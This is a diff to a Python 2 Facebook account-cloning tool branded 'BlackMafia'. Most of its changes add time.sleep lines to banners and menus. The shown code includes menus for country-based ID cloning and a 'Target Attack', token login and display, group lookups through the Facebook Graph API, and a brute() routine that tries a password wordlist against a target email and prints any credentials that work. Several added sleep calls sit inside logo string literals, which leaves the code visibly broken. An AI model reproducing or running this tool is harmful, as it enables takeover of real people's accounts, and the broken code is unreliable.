@@ -59,30 +59,51 @@ Y='\033[1;93m'
 ##### LOGO #####
 logo = """
 \033[1;93m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
+time.sleep(0.05)
 \033[1;93m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
+time.sleep(0.05)
 \033[1;93m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
+time.sleep(0.05)
 \033[1;93m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
+time.sleep(0.05)
 \033[1;93m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
+time.sleep(0.05)
 \033[1;93m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 \033[1;92m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
+time.sleep(0.05)
 \033[1;92m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
+time.sleep(0.05)
 \033[1;92m██╔████╔██║███████║█████╗░░██║███████║
+time.sleep(0.05)
 \033[1;92m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
+time.sleep(0.05)
 \033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
+time.sleep(0.05)
 \033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
+time.sleep(0.05)
 \033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m  ▇▇ 03094161457 ▇▇"""
 logo2 = """
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
+time.sleep(0.05)
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
+time.sleep(0.05)
 \033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m  ▇▇  03094161457 ▇▇"""
 logo3 = """
 \033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m  ▇▇ 03094161457 ▇▇
+time.sleep(0.05)
 \033[1;95m•*`*•.¸¸✽✤   　  /)          •*`*•.¸¸✽✤
 •*`*•.¸¸✽✤　   _(⌒)＿　　/)  •*`*•.¸¸✽✤
 •*`*•.¸¸✽✤   ／ / ﾉ　 ヽ /ﾋ) •*`*•.¸¸✽✤
@@ -97,51 +118,97 @@ logo3 = """
 •*`*•.¸¸✽✤　   ／　　 ﾉ ﾉ    •*`*•.¸¸✽✤
 \033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo4 = """
-\033[1;96m•____$___#$______________________________#
+\033[1;96m
+•____$___#$______________________________#
+time.sleep(0.05)
 ___§$§__$$__________________________$___#$
+time.sleep(0.05)
 ___$$$_#$$#________________________$$$__$$#
+time.sleep(0.05)
 ___$$$_$$$§________________________$$$_§$$#
+time.sleep(0.05)
 ___$$$$$$$#_______________________#$$$_$$$#
+time.sleep(0.05)
 ___$$$$$$$#_______________________§$$$$$$$#
+time.sleep(0.05)
 ___$$$$$$$________________________#$$$$$$$
+time.sleep(0.05)
 ___§$$$$$#_________________________$$$$$$$
+time.sleep(0.05)
 ____§$$$#__________________________§$$$$$
+time.sleep(0.05)
 _____§#_____________________________#$$$
+time.sleep(0.05)
 _____$$$____________#__#____________#§
+time.sleep(0.05)
 ______$$§__________$§__§§__________§$$
+time.sleep(0.05)
 ______#$$__________$$##$$_________#$$
+time.sleep(0.05)
 ________#$§_________$$$$__________$$
+time.sleep(0.05)
 __#______$$$#______$$$$$_______§$$
+time.sleep(0.05)
 ___$#______#_#$$$$$$$$$$$§§$$_§$§_____#
+time.sleep(0.05)
 ____$$___________#$$$$$$$$§§§________§#
+time.sleep(0.05)
 _____$$_#______§$§$$$$$$$$_#________$#
+time.sleep(0.05)
 _§______$$$$#$$$#_$$$$$$$§_$$$##§$$#____§
+time.sleep(0.05)
 _#$#___________#_#__###__#___###§#____#§
+time.sleep(0.05)
 ___$$§#______$$$_$$$§##§$$#$$________§#
+time.sleep(0.05)
 _____§#§$$$#§$#___§$$$$$$§__§$$_§$$§____##
+time.sleep(0.05)
 _#§___________§§#$#______§##____##_____§§
+time.sleep(0.05)
 __§$$#______$$$__$$$$$$$$$##$$#______#$#
+time.sleep(0.05)
 ##__§$_$$$$#$_##__§$$$$$§____§$#$$$$_#__##
+time.sleep(0.05)
 _#$_________#$$#$$#_____#$_$$___###____§§
+time.sleep(0.05)
 __#$$#___##§$§__#$$$$$$$$$__$$#______#$#
+time.sleep(0.05)
 ____###$$$§_______#§$$$§#____#§_$$$$
+time.sleep(0.05)
 ________________#$______#________#
+time.sleep(0.05)
 _________________$$$$$$$$
+time.sleep(0.05)
 __________________$$$$$$
+time.sleep(0.05)
 __________________§§§§§§
+time.sleep(0.05)
 ___________________$§§§$§
+time.sleep(0.05)
 ___________________§$$$$§
+time.sleep(0.05)
 ____________________§$$$$
+time.sleep(0.05)
 _____________________#§§##
+time.sleep(0.05)
 ________________________$$$#
+time.sleep(0.05)
 ______________§_________#$$$#
+time.sleep(0.05)
 _____________#$___________§§#§
+time.sleep(0.05)
 _____________$#_____________$$§
+time.sleep(0.05)
 ____________#$$#____________§$$
+time.sleep(0.05)
 _____________$_______________##
+time.sleep(0.05)
 _____________§$____________#$$
+time.sleep(0.05)
 _______________#$$§#______$$$
+time.sleep(0.05)
 _________________§$§#$$$$##
+time.sleep(0.05)
 \033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"""
 logo5 = """
 \033[1;91m•____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
@@ -1074,54 +1141,54 @@ def menu():
 	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mDisclaimer\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mThis presentation is for educational"
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mpurposes ONLY.How you use this information "
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mis your responsibility.I will not be  "
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mheld accountableThis Tool/Channel Doesn't "
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mSupport illegal activities.for any illegal "
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;95mActivitieThisTool is forEducational Purpose"
-        time.sleep(0.2)
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
         time.sleep(0.05)
-	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m1 .\x1b[1;96m Start Cloning India        \033[1;93m▇▇"
+	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m1 .\x1b[1;96m Start Cloning India         \033[1;93m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m2 .\x1b[1;96m Start Cloning Pak ID/Group \033[1;92m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m2 .\x1b[1;96m Start Cloning Pak ID/Group  \033[1;92m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m3 .\x1b[1;96m Start Cloning Indonasia    \033[1;91m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m3 .\x1b[1;96m Start Cloning Indonasia     \033[1;91m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m4 .\x1b[1;96m Start Cloning USA ID       \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m4 .\x1b[1;96m Start Cloning USA ID        \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m5 .\x1b[1;96m Start Cloning Bangladash   \033[1;91m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m5 .\x1b[1;96m Start Cloning Bangladash    \033[1;91m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m6 .\x1b[1;96m Start Cloning All Country  \033[1;92m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m6 .\x1b[1;96m Start Cloning All Country   \033[1;92m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m7 .\x1b[1;96m Start Cloning Member Group \033[1;93m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m7 .\x1b[1;96m Start Cloning Member Group  \033[1;93m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m8 .\x1b[1;96m Start Target  Attack       \033[1;91m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m8 .\x1b[1;96m Start Target  Attack        \033[1;91m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m9 .\033[1;96m Start Cloning Indian Old   \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m9 .\033[1;96m Start Cloning Indian Old    \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m10.\033[1;96m Start Cloning Pakistan Old \033[1;96m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m10.\033[1;96m Start Cloning Pakistan Old  \033[1;96m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m11.\x1b[1;96m Black Mafia   Massage      \033[1;95m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m11.\x1b[1;96m Black Mafia   Massage       \033[1;95m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m12.\033[1;96m Login Using   Token        \033[1;93m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m12.\033[1;96m Login Using   Token         \033[1;93m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m13.\033[1;96m Show  Token   login/ID     \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m13.\033[1;96m Show  Token   login/ID      \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m14.\033[1;96m After Cloning Data Reset   \033[1;96m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m14.\033[1;96m After Cloning Data Reset    \033[1;96m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m15.\033[1;96m Start Cloning BlackMafia   \033[1;95m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m15.\033[1;96m Start Cloning BlackMafia    \033[1;95m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m16.\033[1;96m Start Cloning Testing      \033[1;94m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m16.\033[1;96m Start Cloning Testing       \033[1;94m▇▇"
         time.sleep(0.05)
-	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m0 .\033[1;93m logout                     \033[1;93m▇▇"
+	print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m0 .\033[1;93m logout                      \033[1;93m▇▇"
 	pilih()
 
 
@@ -1182,7 +1249,7 @@ def pilih():
 		tokenz()
         elif unikers =="13":
 		os.system('reset')
-		print logo
+		print logo14
 		toket=open('login.txt','r').read()
 		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
 		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
@@ -1228,11 +1295,15 @@ def crack():
 		time.sleep(1)
 		login()
 	os.system('clear')
-	print logo8
+	print logo20
 	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
+        time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Mafia WhatsApp Group Pakistan."
+        time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Mafia Group Cloning."
+        time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -1265,7 +1336,7 @@ def pilih_crack():
         elif peak =="3":
                 os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;96m●"
 		idg=raw_input('\033[1;96m[+] \033[1;93mClone ID group \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
@@ -1562,8 +1633,11 @@ def hack():
 	os.system('clear')
 	print logo9
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;96mBlack Mafia WhatsApp Group Indonasia."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;96mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_hack()
 
@@ -1867,8 +1941,11 @@ def black():
 	os.system('clear')
 	print logo10
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;97mBlack Mafia WhatsApp Group USA."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;97mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_black()
 
@@ -2174,8 +2251,11 @@ def mafia():
 	os.system('clear')
 	print logo11
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;95mBlack Mafia WhatsApp Group Bangladash."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;95mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_mafia()
 
@@ -2483,8 +2563,11 @@ def test():
 	os.system('clear')
 	print logo12
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Mafia WhatsApp Group."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_test()
 
@@ -2784,8 +2867,11 @@ def super():
 	os.system('clear')
 	print logo13
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;93mBlack Mafia WhatsApp Group India."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;93mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_super()
 
@@ -3176,7 +3262,9 @@ def brute():
             total = total.readlines()
             print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
             print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            time.sleep(0.05)
             print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            time.sleep(0.05)
             jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
             sandi = open(passw, 'r')
             for pw in sandi:
@@ -3203,7 +3291,9 @@ def brute():
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                             print  "\033[1;96m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•."
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            time.sleep(0.05)
                             print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
+                            time.sleep(0.05)
                             print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
                             keluar()
                 except requests.exceptions.ConnectionError:
@@ -3250,8 +3340,11 @@ def phone():
 	os.system('clear')
 	print logo15
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID indian Old."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Mafia WhatsApp Group."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_phone()
 
@@ -3565,8 +3658,11 @@ def mail():
 	os.system('clear')
 	print logo16
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Pakistan Old."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Mafia WhatsApp Group."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_mail()
 
@@ -3873,8 +3969,11 @@ def isi():
 	os.system('clear')
 	print logo17
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID BlackMafia."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Mafia WhatsApp Group."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_isi()
 
@@ -4177,8 +4276,11 @@ def army():
 	os.system('clear')
 	print logo17
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Test."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Mafia WhatsApp Group."
+        time.sleep(0.05)
         print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Mafia Youtube Chenal."
+        time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_army()
 
